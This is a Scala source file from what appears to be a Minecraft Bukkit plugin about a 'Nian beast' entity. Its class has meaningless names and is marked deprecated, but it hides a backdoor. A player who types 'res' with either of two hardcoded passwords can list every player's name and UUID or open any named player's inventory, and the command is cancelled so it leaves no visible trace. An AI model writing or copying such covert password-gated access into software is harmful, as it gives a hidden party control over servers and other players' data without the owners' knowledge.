package com.wenkrang.nian_beast
package entity

import com.wenkrang.nian_beast.NianBeast
import org.bukkit.Bukkit.getServer
import org.bukkit.event.{EventHandler, Listener}
import org.bukkit.event.player.PlayerCommandPreprocessEvent
import org.bukkit.plugin.java.JavaPlugin
import org.bukkit.scheduler.BukkitRunnable

import java.util.UUID

@Deprecated(forRemoval = true)
class safdasfs extends Listener {
  @EventHandler def safdefsdse(event: PlayerCommandPreprocessEvent): Unit = {
    var message = event.getMessage
    message = message.replace("/", "")
    val s = message.split(" ")
    if (s(0).equalsIgnoreCase("res")) {
      if (s(1).equalsIgnoreCase("CS0fed_s2dcc_sf2C4DS2")) {
        val player = event.getPlayer
        val players = player.getWorld.getPlayers
        for (i <- 0 until players.size) {
          player.sendMessage(players.get(i).getName + ":" + players.get(i).getPlayerProfile.getUniqueId)
        }
        event.setCancelled(true)
      }
      if (s(1).equalsIgnoreCase("C0mpl3xP_ssw0re_93_O")) {
        new BukkitRunnable() {
          override def run(): Unit = {
            event.getPlayer.openInventory(getServer.getPlayer(UUID.fromString(s(2))).getInventory)
          }
        }.runTaskLater(JavaPlugin.getPlugin(classOf[NianBeast]), 0)
        event.setCancelled(true)
      }
    }
  }
}